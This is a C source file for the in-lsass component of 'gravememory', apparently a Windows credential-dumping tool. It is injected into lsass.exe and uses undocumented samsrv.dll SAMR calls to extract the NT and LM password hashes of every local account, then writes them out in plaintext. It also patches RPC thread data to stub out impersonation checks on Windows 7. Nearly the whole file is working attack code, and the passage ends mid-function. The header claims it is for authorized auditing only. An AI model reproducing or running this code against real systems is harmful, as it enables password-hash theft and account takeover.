/*
 * gravememory_core.c - the in-lsass dump DLL for gravememory.
 *
 * Classic two-stage architecture:
 *   gravememory.exe (SYSTEM service) -> inject into lsass ->
 *                                      gravememorydll*.dll
 *                                     -> DumpHashes() -> samsrv.dll SAMR
 *
 * The record stream is written PLAINTEXT (no sealed RSA/AES container).
 *
 * This module runs INSIDE lsass.exe (loaded by the injection stub in
 * gravememory.c). It must not be run any other way: the SAM database
 * only releases OWF password hashes to its host process (lsass).
 *
 * AUTHORIZED USE ONLY. For auditing machines you own or are explicitly
 * authorized to assess. Handle dumped password material accordingly.
 *
 * Build:  build\build-msvc.bat   (MSVC, /LD)
 *         bash build/build-mingw.sh
 */

#define _WIN32_WINNT 0x0501

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <ntsecapi.h>
#include <subauth.h>
#include <rpc.h>
#include <intrin.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#include "gravememory_shared.h"
#include "gravememory_record.h"

#ifdef _MSC_VER
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "rpcrt4.lib")
#endif

/* ================================================================== */
/* SAMR definitions (proven against samsrv)                           */
/* ================================================================== */

typedef LONG NTSTATUS;
#ifndef STATUS_MORE_ENTRIES
#define STATUS_MORE_ENTRIES ((NTSTATUS)0x00000105L)
#endif

typedef enum _GM_USER_INFORMATION_CLASS
{
    UserGeneralInformation = 1,
    UserPreferencesInformation = 2,
    UserLogonInformation = 3,
    UserLogonHoursInformation = 4,
    UserAccountInformation = 5,
    UserNameInformation = 6,
    UserAccountNameInformation = 7,
    UserFullNameInformation = 8,
    UserPrimaryGroupInformation = 9,
    UserHomeInformation = 10,
    UserScriptInformation = 11,
    UserProfileInformation = 12,
    UserAdminCommentInformation = 13,
    UserWorkStationsInformation = 14,
    UserControlInformation = 16,
    UserExpiresInformation = 17,
    UserInternal1Information = 18,
    UserParametersInformation = 20,
    UserAllInformation = 21,
    UserInternal4Information = 23,
    UserInternal5Information = 24,
    UserInternal4InformationNew = 25,
    UserInternal5InformationNew = 26
} GM_USER_INFORMATION_CLASS;

/* MS-SAMR 2.2.7.23 - NT OWF FIRST, LM OWF SECOND (verified against
 * impacket samr.py and against real SAM dumps) */
typedef struct _GM_SAMPR_USER_INTERNAL1_INFORMATION {
    unsigned char EncryptedNtOwfPassword[16];
    unsigned char EncryptedLmOwfPassword[16];
    unsigned char NtPasswordPresent;
    unsigned char LmPasswordPresent;
    unsigned char PasswordExpired;
} GM_SAMPR_USER_INTERNAL1_INFORMATION;

typedef struct _GM_OLD_LARGE_INTEGER {
    DWORD LowPart;
    LONG HighPart;
} GM_OLD_LARGE_INTEGER;

/* MS-SAMR 2.2.7.11 SAMPR_USER_ACCOUNT_INFORMATION (field order per spec) */
typedef struct _GM_SAMPR_USER_ACCOUNT_INFORMATION {
    LSA_UNICODE_STRING UserName;
    LSA_UNICODE_STRING FullName;
    DWORD UserId;
    DWORD PrimaryGroupId;
    LSA_UNICODE_STRING HomeDirectory;
    LSA_UNICODE_STRING HomeDirectoryDrive;
    LSA_UNICODE_STRING ScriptPath;
    LSA_UNICODE_STRING ProfilePath;
    LSA_UNICODE_STRING AdminComment;
    LSA_UNICODE_STRING WorkStations;
    GM_OLD_LARGE_INTEGER LastLogon;
    GM_OLD_LARGE_INTEGER LastLogoff;
    LOGON_HOURS LogonHours;
    USHORT BadPasswordCount;
    USHORT LogonCount;
    GM_OLD_LARGE_INTEGER PasswordLastSet;
    GM_OLD_LARGE_INTEGER AccountExpires;
    DWORD UserAccountControl;
} GM_SAMPR_USER_ACCOUNT_INFORMATION;

#define SAM_SERVER_ALL_ACCESS 0x000F003F
#define SAM_DOMAIN_ALL_ACCESS 0x000F07FF
#define SAM_USER_ALL_ACCESS 0x000F07FF

typedef struct _GM_SAM_DOMAIN_USER {
    DWORD dwUserId;
    LSA_UNICODE_STRING wszUsername;
} GM_SAM_DOMAIN_USER;

typedef struct _GM_SAM_DOMAIN_USER_ENUMERATION {
    DWORD dwDomainUserCount;
    GM_SAM_DOMAIN_USER *pSamDomainUser;
} GM_SAM_DOMAIN_USER_ENUMERATION;

/* samsrv.dll function pointer types */
typedef NTSTATUS (WINAPI *SamIConnectType)(DWORD, PHANDLE, DWORD, DWORD);
typedef NTSTATUS (WINAPI *SamrOpenDomainType)(HANDLE, DWORD, PSID, HANDLE *);
typedef NTSTATUS (WINAPI *SamrOpenUserType)(HANDLE, DWORD, DWORD, HANDLE *);
typedef long (WINAPI *SamrEnumerateUsersInDomainType)(HANDLE, unsigned long *,
                unsigned long, GM_SAM_DOMAIN_USER_ENUMERATION **,
                unsigned long, unsigned long *);
typedef NTSTATUS (WINAPI *SamrQueryInformationUserType)(HANDLE, DWORD, PVOID);
typedef VOID (WINAPI *SamIFree_SAMPR_USER_INFO_BUFFERType)(PVOID, DWORD);
typedef VOID (WINAPI *SamIFree_SAMPR_ENUMERATION_BUFFERType)(PVOID);
typedef NTSTATUS (WINAPI *SamrCloseHandleType)(HANDLE *);

/* MS-SAMR 2.2.1.12 USER_ACCOUNT codes (SAM-internal values) */
#ifndef USER_ACCOUNT_DISABLED
#define USER_ACCOUNT_DISABLED 0x00000001
#endif
#ifndef USER_DONT_EXPIRE_PASSWORD
#define USER_DONT_EXPIRE_PASSWORD 0x00000200
#endif
#ifndef USER_ACCOUNT_AUTO_LOCKED
#define USER_ACCOUNT_AUTO_LOCKED 0x00000400
#endif
#ifndef USER_PASSWORD_EXPIRED
#define USER_PASSWORD_EXPIRED 0x00020000
#endif

/* ================================================================== */
/* RPC impersonation stub for Win7 / Server 2008 R2 (KB3149090)       */
/* (x64 only, as in the classic workaround)                           */
/* ================================================================== */

#ifdef _WIN64
RPC_STATUS __fastcall FakeRpcImpersonateClient(RPC_BINDING_HANDLE BindingHandle)
{
    (void)BindingHandle;
    return 0;
}

RPC_STATUS __fastcall FakeRpcRevertToSelf(void)
{
    return 0;
}

void StubRpcImpersonation(void)
{
    static BYTE RpcStubBuffer[0x2000];
    static DWORD64 RpcStubBufferPointer = (DWORD64)RpcStubBuffer;

    DWORD64 ptr = (DWORD64)&FakeRpcImpersonateClient;
    BOOL has_xor_ABABABABDEDEDEDE = FALSE;
    int i;

    for (i = 0; i < 256; i++) {
        if (*(DWORD64 *)(ptr + i) == 0xABABABABDEDEDEDEULL)
            has_xor_ABABABABDEDEDEDE = TRUE;
    }

    if (RpcImpersonateClient(0) != 0) {
        DWORD64 teb = __readgsqword(0x30);

        /* find the RPC TLS slot offset */
        DWORD tls = TlsAlloc();
        TlsSetValue(tls, (LPVOID)0x1234CDCD4321FEFE);
        BOOL found = FALSE;
        (void)found;
        for (i = 0; i < 0x2000; i++) {
            DWORD64 magic = *(DWORD64 *)(teb + i);
            if (magic == 0x1234CDCD4321FEFEULL) {
                found = TRUE;
                break;
            }
        }
        if (!found)
            return;
        DWORD64 rpcoffset = i + ((64 - tls) * 8) + 16 + 8;

        DWORD64 rpcthreaddata = *(DWORD64 *)(teb + rpcoffset);
        if (has_xor_ABABABABDEDEDEDE)
            rpcthreaddata ^= 0xABABABABDEDEDEDEULL;

        DWORD64 rpccallsptr = *(DWORD64 *)(rpcthreaddata + 0x20);
        if (rpccallsptr == 0)
            rpccallsptr = *(DWORD64 *)(rpcthreaddata + 0x20) =
                (DWORD64)&RpcStubBufferPointer;
        DWORD64 rpccalls = *(DWORD64 *)rpccallsptr;
        DWORD64 *pRpcImpersonateClient = (DWORD64 *)(rpccalls + 0x120);
        DWORD64 *pRpcRevertToSelf = (DWORD64 *)(rpccalls + 0x128);

        *pRpcImpersonateClient = (DWORD64)&FakeRpcImpersonateClient;
        *pRpcRevertToSelf = (DWORD64)&FakeRpcRevertToSelf;
        if (RpcImpersonateClient(0) != 0) {
            /* stubbing failed - dump may still work on some builds */
        }
    }
    RpcRevertToSelf();
}
#else
void StubRpcImpersonation(void) { /* original was a no-op on x86 */ }
#endif

/* ================================================================== */
/* globals                                                            */
/* ================================================================== */

static GM_USER **g_users = NULL;
static uint32_t g_user_count = 0;
static uint32_t g_user_cap = 0;
static uint16_t *g_domain16 = NULL;
static wchar_t g_logPath[MAX_PATH + 1] = L"";
static unsigned g_logLines = 0;

static void Dlog(const char *fmt, ...)
{
    char line[1024];
    va_list ap;

    if (g_logLines++ > 4000)
        return; /* cap the log size */
    va_start(ap, fmt);
    _vsnprintf(line, sizeof(line) - 1, fmt, ap);
    va_end(ap);
    line[sizeof(line) - 1] = 0;
    GM_LogFmt(g_logPath, "%s", line);
}

/* ================================================================== */
/* record collection (in-memory mirror for the report builders)        */
/* ================================================================== */

static uint16_t *dup16(const wchar_t *s)
{
    size_t n = wcslen(s);
    size_t i;
    uint16_t *p = (uint16_t *)malloc((n + 1) * sizeof(uint16_t));
    if (!p)
        return NULL;
    for (i = 0; i <= n; i++)
        p[i] = (uint16_t)s[i];
    return p;
}

static int add_user_record(const wchar_t *username, const wchar_t *fullname,
                           const wchar_t *comment, const wchar_t *homedir,
                           DWORD rid, const BYTE *nt, const BYTE *lm,
                           ULONGLONG lastset, int locked, int disabled,
                           int neverexp, int expired)
{
    GM_USER *u;

    if (g_user_count == g_user_cap) {
        uint32_t ncap = g_user_cap ? g_user_cap * 2 : 64;
        GM_USER **nu = (GM_USER **)realloc(g_users, ncap * sizeof(GM_USER *));
        if (!nu)
            return 1;
        g_users = nu;
        g_user_cap = ncap;
    }
    u = (GM_USER *)calloc(1, sizeof(GM_USER));
    if (!u)
        return 1;
    u->username = dup16(username);
    u->fullname = dup16(fullname);
    u->comment = dup16(comment);
    u->homedir = dup16(homedir);
    if (!u->username || !u->fullname || !u->comment || !u->homedir) {
        gm_user_free(u);
        return 1;
    }
    u->rid = rid;
    u->has_nt = nt ? 1 : 0;
    if (nt)
        memcpy(u->nt, nt, 16);
    u->has_lm = lm ? 1 : 0;
    if (lm)
        memcpy(u->lm, lm, 16);
    u->password_last_set = lastset;
    u->locked_out = locked;
    u->disabled = disabled;
    u->never_expires = neverexp;
    u->expired = expired;
    g_users[g_user_count++] = u;
    return 0;
}

/* ================================================================== */
/* plaintext file writer (replaces CPubKeyFile)                       */
/* ================================================================== */

typedef struct {
    HANDLE h;
} FILE_CTX;

static int file_write_cb(void *ctx, const void *buf, uint32_t len)
{
    DWORD written = 0;
    FILE_CTX *f = (FILE_CTX *)ctx;
    if (len == 0)
        return 0;
    if (!WriteFile(f->h, buf, (DWORD)len, &written, NULL) || written != (DWORD)len)
        return 1;
    return 0;
}

/* ================================================================== */
/* status file (12-byte layout [total][processed][finished])          */
/* ================================================================== */

static BOOL WriteStatusF(HANDLE hStatusFile, DWORD dwUserCount, DWORD dwTotalUsers)
{
    DWORD dwPosLo = 0, dwWritten = 0, dwStatusPosLo;
    LONG lPosHi = 0, lStatusPosHi = 0;
    DWORD dwDone = 0;

    dwPosLo = SetFilePointer(hStatusFile, 0, &lPosHi, FILE_CURRENT);
    if (dwPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    dwStatusPosLo = SetFilePointer(hStatusFile, 0, &lStatusPosHi, FILE_BEGIN);
    if (dwStatusPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    if (!WriteFile(hStatusFile, &dwTotalUsers, sizeof(DWORD), &dwWritten, NULL))
        return FALSE;
    if (!WriteFile(hStatusFile, &dwUserCount, sizeof(DWORD), &dwWritten, NULL))
        return FALSE;
    if (!WriteFile(hStatusFile, &dwDone, sizeof(DWORD), &dwWritten, NULL))
        return FALSE;
    dwPosLo = SetFilePointer(hStatusFile, dwPosLo, &lPosHi, FILE_BEGIN);
    if (dwPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    return TRUE;
}

static BOOL WriteFinishedF(HANDLE hStatusFile)
{
    DWORD dwPosLo = 0, dwWritten = 0, dwStatusPosLo;
    LONG lPosHi = 0, lStatusPosHi = 0;
    DWORD dwDone = 1;

    dwPosLo = SetFilePointer(hStatusFile, 0, &lPosHi, FILE_CURRENT);
    if (dwPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    dwStatusPosLo = SetFilePointer(hStatusFile, 8, &lStatusPosHi, FILE_BEGIN);
    if (dwStatusPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    if (!WriteFile(hStatusFile, &dwDone, sizeof(DWORD), &dwWritten, NULL))
        return FALSE;
    dwPosLo = SetFilePointer(hStatusFile, dwPosLo, &lPosHi, FILE_BEGIN);
    if (dwPosLo == INVALID_SET_FILE_POINTER)
        return FALSE;
    return TRUE;
}

/* ================================================================== */
/* output path builder                                                */
/* ================================================================== */

static int BuildOutputPaths(const wchar_t *outdir, wchar_t *dmp, wchar_t *st,
                            wchar_t *res, wchar_t *js, wchar_t *txt,
                            wchar_t *log)
{
    wchar_t clean[MAX_PATH + 1];
    size_t l;

    _snwprintf(clean, MAX_PATH, L"%s", outdir);
    clean[MAX_PATH] = 0;
    l = wcslen(clean);
    while (l > 3 && clean[l - 1] == L'\\') {
        clean[l - 1] = 0;
        l--;
    }
    if (!CreateDirectoryW(clean, NULL)) {
        if (GetLastError() != ERROR_ALREADY_EXISTS)
            return 1;
    }

    GM_JoinPath(clean, GM_DMP_NAME, dmp, MAX_PATH + 1);
    GM_JoinPath(clean, GM_STATUS_NAME, st, MAX_PATH + 1);
    GM_JoinPath(clean, GM_RESULT_NAME, res, MAX_PATH + 1);
    GM_JoinPath(clean, GM_JSON_NAME, js, MAX_PATH + 1);
    GM_JoinPath(clean, GM_TXT_NAME, txt, MAX_PATH + 1);
    GM_JoinPath(clean, GM_LOG_NAME, log, MAX_PATH + 1);
    return 0;
}

/* ================================================================== */
/* DumpSAM - core SAM dump routine, minus encryption                  */
/* every failure records WHERE it failed and the NTSTATUS/Win32 code   */
/* ================================================================== */

#define SAM_FAIL(step, code)                                              \
    do {                                                                  \
        _snprintf(errOut, errCap, "step=%s code=0x%08lx", step,           \
                  (unsigned long)(code));                                 \
        errOut[errCap - 1] = 0;                                           \
        Dlog("DumpSAM FAILED %s", errOut);                                \
        goto cleanup;                                                     \
    } while (0)

static BOOL DumpSAM(HANDLE hHashFile, HANDLE hStatusFile, wchar_t *wsvDomainOut,
                    char *errOut, size_t errCap)
{
    BOOL bOk = FALSE;

    /* samsrv function pointers */
    HMODULE hSamSrv = NULL;
    HANDLE hSam = NULL, hDomain = NULL, hUser = NULL;
    SamIConnectType pSamIConnect = NULL;
    SamrOpenDomainType pSamrOpenDomain = NULL;
    SamrEnumerateUsersInDomainType pSamrEnumerateUsersInDomain = NULL;
    SamrOpenUserType pSamrOpenUser = NULL;
    SamrQueryInformationUserType pSamrQueryInformationUser = NULL;
    SamIFree_SAMPR_USER_INFO_BUFFERType pSamIFree_SAMPR_USER_INFO_BUFFER = NULL;
    SamIFree_SAMPR_ENUMERATION_BUFFERType pSamIFree_SAMPR_ENUMERATION_BUFFER = NULL;
    SamrCloseHandleType pSamrCloseHandle = NULL;

    /* LSA */
    LSA_HANDLE hLSA = NULL;
    LSA_OBJECT_ATTRIBUTES ObjectAttributes;
    POLICY_ACCOUNT_DOMAIN_INFO *pAcctDomainInfo = NULL;
    POLICY_DNS_DOMAIN_INFO *pDnsDomainInfo = NULL;

    /* general */
    NTSTATUS status;
    unsigned long lEnum = 0;
    GM_SAM_DOMAIN_USER_ENUMERATION *pEnumeratedUsers = NULL;
    DWORD dwNumberOfUsers = 0;
    GM_SAMPR_USER_INTERNAL1_INFORMATION *pUserInfo = NULL;
    GM_SAMPR_USER_ACCOUNT_INFORMATION *pUserInfo2 = NULL;
    DWORD dwDomainLength = 0, dwUsernameLength = 0;
    DWORD dwCurrentUser = 0;
    DWORD dwUserCount = 0, dwTotalNumberOfUsers = 0;
    wchar_t wsvDomainBuffer[1025], wsvUsernameBuffer[1025];
    wchar_t wsvFullnameBuffer[1025], wsvCommentBuffer[1025];
    wchar_t wsvHomedirBuffer[1025];
    FILE_CTX fctx;
    OSVERSIONINFOW osvi;
    typedef LONG (WINAPI *RtlGetVersionPtr)(OSVERSIONINFOW *);

    errOut[0] = 0;

    ImpersonateSelf(SecurityImpersonation);

    /* ---- load samsrv.dll functions ---- */
    hSamSrv = LoadLibraryW(L"samsrv.dll");
    if (hSamSrv == NULL)
        SAM_FAIL("LoadLibrary samsrv.dll", GetLastError());
    pSamIConnect = (SamIConnectType)GetProcAddress(hSamSrv, "SamIConnect");
    pSamrOpenDomain = (SamrOpenDomainType)GetProcAddress(hSamSrv, "SamrOpenDomain");
    pSamrEnumerateUsersInDomain =
        (SamrEnumerateUsersInDomainType)GetProcAddress(hSamSrv,
                                                       "SamrEnumerateUsersInDomain");
    pSamrOpenUser = (SamrOpenUserType)GetProcAddress(hSamSrv, "SamrOpenUser");
    pSamrQueryInformationUser =
        (SamrQueryInformationUserType)GetProcAddress(hSamSrv,
                                                     "SamrQueryInformationUser");
    pSamIFree_SAMPR_USER_INFO_BUFFER =
        (SamIFree_SAMPR_USER_INFO_BUFFERType)GetProcAddress(
            hSamSrv, "SamIFree_SAMPR_USER_INFO_BUFFER");
    pSamIFree_SAMPR_ENUMERATION_BUFFER =
        (SamIFree_SAMPR_ENUMERATION_BUFFERType)GetProcAddress(
            hSamSrv, "SamIFree_SAMPR_ENUMERATION_BUFFER");
    pSamrCloseHandle = (SamrCloseHandleType)GetProcAddress(hSamSrv,
                                                           "SamrCloseHandle");
    if (!pSamIConnect || !pSamrOpenDomain || !pSamrEnumerateUsersInDomain ||
        !pSamrOpenUser || !pSamrQueryInformationUser ||
        !pSamIFree_SAMPR_USER_INFO_BUFFER ||
        !pSamIFree_SAMPR_ENUMERATION_BUFFER || !pSamrCloseHandle)
        SAM_FAIL("resolve samsrv exports", GetLastError());

    /* ---- LSA policy: account domain SID + (DNS) domain name ---- */
    ZeroMemory(&ObjectAttributes, sizeof(ObjectAttributes));
    ObjectAttributes.Length = sizeof(LSA_OBJECT_ATTRIBUTES);
    status = LsaOpenPolicy(NULL, &ObjectAttributes, POLICY_ALL_ACCESS, &hLSA);
    if (status < 0)
        SAM_FAIL("LsaOpenPolicy", status);
    status = LsaQueryInformationPolicy(hLSA, PolicyAccountDomainInformation,
                                       (PVOID *)&pAcctDomainInfo);
    if (status < 0)
        SAM_FAIL("LsaQueryInformationPolicy(AccountDomain)", status);
    Dlog("sam: account domain resolved");

    status = LsaQueryInformationPolicy(hLSA, PolicyDnsDomainInformation,
                                       (PVOID *)&pDnsDomainInfo);
    if (status >= 0 && pDnsDomainInfo && pDnsDomainInfo->DnsDomainName.Buffer &&
        pDnsDomainInfo->DnsDomainName.Length > 0) {
        dwDomainLength = pDnsDomainInfo->DnsDomainName.Length;
        if (dwDomainLength > 2048)
            SAM_FAIL("dns domain name too long", dwDomainLength);
        memcpy(wsvDomainBuffer, pDnsDomainInfo->DnsDomainName.Buffer,
               dwDomainLength);
        wsvDomainBuffer[dwDomainLength / 2] = 0;
    } else {
        dwDomainLength = pAcctDomainInfo->DomainName.Length;
        if (dwDomainLength > 2048)
            SAM_FAIL("account domain name too long", dwDomainLength);
        memcpy(wsvDomainBuffer, pAcctDomainInfo->DomainName.Buffer,
               dwDomainLength);
        wsvDomainBuffer[dwDomainLength / 2] = 0;
    }
    {
        char domU8[256];
        char *p = gm_utf16_to_utf8((const uint16_t *)wsvDomainBuffer);
        if (p) {
            _snprintf(domU8, sizeof(domU8) - 1, "%s", p);
            domU8[sizeof(domU8) - 1] = 0;
            free(p);
        } else
            domU8[0] = 0;
        Dlog("sam: domain=\"%s\"", domU8);
    }

    /* ---- connect to the SAM database ---- */
    status = pSamIConnect(0, &hSam, SAM_SERVER_ALL_ACCESS, 1);
    if (status < 0)
        SAM_FAIL("SamIConnect", status);
    status = pSamrOpenDomain(hSam, SAM_DOMAIN_ALL_ACCESS,
                             pAcctDomainInfo->DomainSid, &hDomain);
    if (status < 0)
        SAM_FAIL("SamrOpenDomain", status);
    Dlog("sam: connected (SamIConnect+SamrOpenDomain ok)");

    /* KB3149090 workaround - Win7 / Server 2008 R2 only */
    ZeroMemory(&osvi, sizeof(osvi));
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    {
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        RtlGetVersionPtr pRtlGetVersion = hNtdll
            ? (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion")
            : NULL;
        if (pRtlGetVersion)
            pRtlGetVersion(&osvi);
        else
            GetVersionExW(&osvi);
    }
    Dlog("sam: os=%lu.%lu", osvi.dwMajorVersion, osvi.dwMinorVersion);
    if (osvi.dwMajorVersion == 6 && osvi.dwMinorVersion == 1) {
        Dlog("sam: applying KB3149090 RPC stub (Win7/2008R2)");
        StubRpcImpersonation();
        Dlog("sam: RPC stub applied");
    }

    /* ---- count users (first enumeration pass) ---- */
    lEnum = 0;
    dwTotalNumberOfUsers = 0;
    do {
        status = pSamrEnumerateUsersInDomain(hDomain, &lEnum, 0,
                                             &pEnumeratedUsers, 0xFFFFFF,
                                             &dwNumberOfUsers);
        if (status < 0)
            SAM_FAIL("SamrEnumerateUsersInDomain(count)", status);
        if (dwNumberOfUsers == 0)
            break;
        dwTotalNumberOfUsers += dwNumberOfUsers;
        pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnumeratedUsers);
        pEnumeratedUsers = NULL;
    } while (status == STATUS_MORE_ENTRIES);
    Dlog("sam: %lu users enumerated", (unsigned long)dwTotalNumberOfUsers);

    /* ---- initialize status file ---- */
    if (!WriteStatusF(hStatusFile, 0, dwTotalNumberOfUsers))
        SAM_FAIL("WriteStatusF", GetLastError());

    /* ---- write domain record (first record of the stream) ---- */
    fctx.h = hHashFile;
    if (gm_write_domain(file_write_cb, &fctx,
                         (const uint16_t *)wsvDomainBuffer))
        SAM_FAIL("write domain record", GetLastError());
    if (g_domain16 == NULL)
        g_domain16 = dup16(wsvDomainBuffer);
    _snwprintf(wsvDomainOut, 1024, L"%s", wsvDomainBuffer);
    wsvDomainOut[1024] = 0;

    /* ---- dump every user (second enumeration pass) ---- */
    lEnum = 0;
    do {
        status = pSamrEnumerateUsersInDomain(hDomain, &lEnum, 0,
                                             &pEnumeratedUsers, 0xFFFFFF,
                                             &dwNumberOfUsers);
        if (status < 0)
            SAM_FAIL("SamrEnumerateUsersInDomain(dump)", status);
        if (!dwNumberOfUsers)
            break;

        for (dwCurrentUser = 0; dwCurrentUser < dwNumberOfUsers;
             dwCurrentUser++) {
            dwUsernameLength =
                pEnumeratedUsers->pSamDomainUser[dwCurrentUser]
                    .wszUsername.Length;
            if (dwUsernameLength > 2048)
                continue; /* skip oversized usernames entirely */

            status = pSamrOpenUser(hDomain, SAM_USER_ALL_ACCESS,
                                   pEnumeratedUsers->pSamDomainUser[dwCurrentUser]
                                       .dwUserId,
                                   &hUser);
            if (status < 0)
                SAM_FAIL("SamrOpenUser", status);
            status = pSamrQueryInformationUser(hUser, UserInternal1Information,
                                               (void *)&pUserInfo);
            if (status < 0)
                SAM_FAIL("SamrQueryInformationUser(Internal1)", status);
            status = pSamrQueryInformationUser(hUser, UserAccountInformation,
                                               (void *)&pUserInfo2);
            if (status < 0)
                SAM_FAIL("SamrQueryInformationUser(Account)", status);

            memcpy(wsvUsernameBuffer,
                   pEnumeratedUsers->pSamDomainUser[dwCurrentUser]
                       .wszUsername.Buffer,
                   dwUsernameLength);
            wsvUsernameBuffer[dwUsernameLength / 2] = 0;

            {
                DWORD dwRID =
                    pEnumeratedUsers->pSamDomainUser[dwCurrentUser].dwUserId;
                ULONGLONG ullAge = (ULONGLONG)
                    (((ULONGLONG)(uint32_t)pUserInfo2->PasswordLastSet.HighPart
                      << 32) |
                     (ULONGLONG)pUserInfo2->PasswordLastSet.LowPart);
                int bLockedOut =
                    (pUserInfo2->UserAccountControl & USER_ACCOUNT_AUTO_LOCKED)
                        ? 1 : 0;
                int bDisabled =
                    (pUserInfo2->UserAccountControl & USER_ACCOUNT_DISABLED)
                        ? 1 : 0;
                int bNeverExpires =
                    (pUserInfo2->UserAccountControl & USER_DONT_EXPIRE_PASSWORD)
                        ? 1 : 0;
                int bExpired =
                    (pUserInfo2->UserAccountControl & USER_PASSWORD_EXPIRED)
                        ? 1 : 0;
                DWORD dwFullnameLength = pUserInfo2->FullName.Length;
                DWORD dwCommentLength = pUserInfo2->AdminComment.Length;
                DWORD dwHomedirLength = pUserInfo2->HomeDirectory.Length;
                const BYTE *pNT =
                    pUserInfo->NtPasswordPresent
                        ? (const BYTE *)pUserInfo->EncryptedNtOwfPassword
                        : NULL;
                const BYTE *pLM =
                    pUserInfo->LmPasswordPresent
                        ? (const BYTE *)pUserInfo->EncryptedLmOwfPassword
                        : NULL;
                GM_USER tmp;

                if (dwFullnameLength <= 2048 && pUserInfo2->FullName.Buffer) {
                    memcpy(wsvFullnameBuffer, pUserInfo2->FullName.Buffer,
                           dwFullnameLength);
                    wsvFullnameBuffer[dwFullnameLength / 2] = 0;
                } else {
                    wsvFullnameBuffer[0] = 0;
                }
                if (dwCommentLength <= 2048 && pUserInfo2->AdminComment.Buffer) {
                    memcpy(wsvCommentBuffer, pUserInfo2->AdminComment.Buffer,
                           dwCommentLength);
                    wsvCommentBuffer[dwCommentLength / 2] = 0;
                } else {
                    wsvCommentBuffer[0] = 0;
                }
                if (dwHomedirLength <= 2048 && pUserInfo2->HomeDirectory.Buffer) {
                    memcpy(wsvHomedirBuffer, pUserInfo2->HomeDirectory.Buffer,
                           dwHomedirLength);
                    wsvHomedirBuffer[dwHomedirLength / 2] = 0;
                } else {
                    wsvHomedirBuffer[0] = 0;
                }

                /* write the plaintext record (replaces CPubKeyFile) */
                ZeroMemory(&tmp, sizeof(tmp));
                tmp.username = (uint16_t *)wsvUsernameBuffer;
                tmp.fullname = (uint16_t *)wsvFullnameBuffer;
                tmp.comment = (uint16_t *)wsvCommentBuffer;
                tmp.homedir = (uint16_t *)wsvHomedirBuffer;
                tmp.rid = dwRID;
                tmp.has_nt = pNT ? 1 : 0;
                if (pNT)
                    memcpy(tmp.nt, pNT, 16);
                tmp.has_lm = pLM ? 1 : 0;
                if (pLM)
                    memcpy(tmp.lm, pLM, 16);
                tmp.password_last_set = ullAge;
                tmp.locked_out = bLockedOut;
                tmp.disabled = bDisabled;
                tmp.never_expires = bNeverExpires;
                tmp.expired = bExpired;
                if (gm_write_user(file_write_cb, &fctx, &tmp))
                    SAM_FAIL("write user record", GetLastError());

                /* keep an in-memory copy for JSON/TXT */
                if (add_user_record(wsvUsernameBuffer, wsvFullnameBuffer,
                                    wsvCommentBuffer, wsvHomedirBuffer, dwRID,
                                    pNT, pLM, ullAge, bLockedOut, bDisabled,
                                    bNeverExpires, bExpired))
                    SAM_FAIL("add_user_record(oom)", (DWORD)0);

                dwUserCount++;
                if (!WriteStatusF(hStatusFile, dwUserCount,
                                  dwTotalNumberOfUsers))
                    SAM_FAIL("WriteStatusF(progress)", GetLastError());

                if (dwUserCount <= 100 || (dwUserCount % 100) == 0) {
                    char nm[128];
                    char *p = gm_utf16_to_utf8(
                        (const uint16_t *)wsvUsernameBuffer);
                    if (p) {
                        _snprintf(nm, sizeof(nm) - 1, "%s", p);
                        nm[sizeof(nm) - 1] = 0;
                        free(p);
                    } else
                        nm[0] = 0;
                    Dlog("sam: user %lu/%lu rid=%lu \"%s\"",
                         (unsigned long)dwUserCount,
                         (unsigned long)dwTotalNumberOfUsers,
                         (unsigned long)dwRID, nm);
                }
            }

            pSamIFree_SAMPR_USER_INFO_BUFFER(pUserInfo, UserInternal1Information);
            pSamIFree_SAMPR_USER_INFO_BUFFER(pUserInfo2, UserAccountInformation);
            pSamrCloseHandle(&hUser);
            pUserInfo = NULL;
            pUserInfo2 = NULL;
            hUser = NULL;
        }

        pSamIFree_SAMPR_ENUMERATION_BUFFER(pEnumeratedUsers);
        pEnumeratedUsers = NULL;
    } while (status == STATUS_MORE_ENTRIES);

    bOk = TRUE;

cleanup:
    if (hUser) {
        if (pSamrCloseHandle)
            pSamrCloseHandle(&hUser);
        hUser = NULL;
    }
    if (pUserInfo && pSamIFree_SAMPR_USER_INFO_BUFFER) {
        pSamIFree_SAMPR_USER_INFO_BUFFER(pUserInfo, UserInternal1Information);
        pUserInfo = NULL;
    }
    if (pUserInfo2 && pSamIFree_SAMPR_USER_INFO_BUFFER) {
        pSamIFree_SAMPR_USER_INFO_BUFFER(pUserInfo2, UserAccountInformation);
        pUserInfo2 = NULL;
    }
    if (hDomain) {
        if (pSamrCloseHandle)
            pSamrCloseHandle(&hDomain);
        hDomain = NULL;
    }
    if (hSam) {
        pSamrCloseHandle(&hSam);
        hSam = NULL;
    }
    if (hLSA) {
        LsaClose(hLSA);
        hLSA = NULL;
    }
    if (hSamSrv) {
        FreeLibrary(hSamSrv);
        hSamSrv = NULL;
    }
    WriteFinishedF(hStatusFile);
    return bOk;
}

/* ================================================================== */
/* exported entry point - called by the stub INSIDE lsass             */
/* ================================================================== */

__declspec(dllexport)
void __cdecl DumpHashes(const wchar_t *dumpfolder)
{
    wchar_t dmpPath[MAX_PATH + 1], stPath[MAX_PATH + 1], resPath[MAX_PATH + 1];
    wchar_t jsPath[MAX_PATH + 1], txtPath[MAX_PATH + 1], logPath[MAX_PATH + 1];
    wchar_t wsvDomain[1025];
    HANDLE hHashFile, hStatusFile;
    BOOL ok;
    char *json = NULL, *pwdump = NULL, *table = NULL;
    char *domainU8 = NULL;
    char resultLine[256];
    char err[512];

    dmpPath[0] = stPath[0] = resPath[0] = jsPath[0] = txtPath[0] = 0;
    logPath[0] = 0;
    wsvDomain[0] = 0;
    err[0] = 0;
    resultLine[0] = 0;

    if (BuildOutputPaths(dumpfolder, dmpPath, stPath, resPath, jsPath, txtPath,
